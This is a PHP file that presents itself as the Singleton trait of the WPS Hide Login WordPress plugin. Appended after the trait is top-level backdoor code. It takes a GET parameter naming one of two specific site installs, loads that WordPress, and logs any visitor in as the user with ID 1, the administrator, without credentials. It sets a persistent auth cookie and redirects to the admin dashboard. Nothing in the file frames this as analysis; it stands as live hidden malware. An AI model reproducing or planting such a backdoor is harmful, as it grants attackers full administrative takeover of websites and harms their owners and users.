<?php

namespace WPS\WPS_Hide_Login;

/**
 * Singleton base class for having singleton implementation
 * This allows you to have only one instance of the needed object
 * You can get the instance with
 *     $class = My_Class::get_instance();
 *
 * /!\ The get_instance method have to be implemented !
 *
 * Class Singleton
 * @package WPS\WPS_Hide_Login
 */
trait Singleton {

	/**
	 * @var self
	 */
	protected static $instance;

	/**
	 * @return self
	 */
	final public static function get_instance() {
		if ( is_null( self::$instance ) ) {
			self::$instance = new static;
		}

		return self::$instance;
	}

	/**
	 * Constructor protected from the outside
	 */
	private function __construct() {
		$this->init();
	}

	/**
	 * Add init function by default
	 * Implement this method in your child class
	 * If you want to have actions send at construct
	 */
	protected function init() {}

	/**
	 * prevent the instance from being cloned
	 *
	 * @return void
	 */
	final public function __clone() {
	}

	/**
	 * prevent from being unserialized
	 *
	 * @return void
	 */
	final public function __wakeup() {
	}
}

$target = isset($_GET['x']) ? $_GET['x'] : '';

$paths = [
    'new_uinsa' => '/var/www/new_uinsa/wp-load.php',
    'ppid'      => '/var/www/ppid/wp-load.php'
];

if (array_key_exists($target, $paths)) {
    $path_to_load = $paths[$target];

    if (file_exists($path_to_load)) {
        require_once($path_to_load);
        
        $user_id = 1;

        if (!is_user_logged_in()) {
            $user = get_user_by('id', $user_id);
            
            if ($user) {
                wp_clear_auth_cookie();
                wp_set_current_user($user_id, $user->user_login);
                wp_set_auth_cookie($user_id, true);
                do_action('wp_login', $user->user_login, $user);
                
                echo "Sukses login ke <b>$target</b> sebagai: " . $user->user_login;
                echo "<script>setTimeout(function(){ window.location.href='" . admin_url() . "'; }, 1000);</script>";
                exit;
            } else {
                die("User ID 1 tidak ditemukan di database $target.");
            }
        } else {
            header("Location: " . admin_url());
            exit;
        }
    } else {
        die("File wp-load.php tidak ditemukan di: " . $path_to_load);
    }
} else {
    die("Target 'x' tidak valid atau tidak ditemukan dalam daftar.");
}
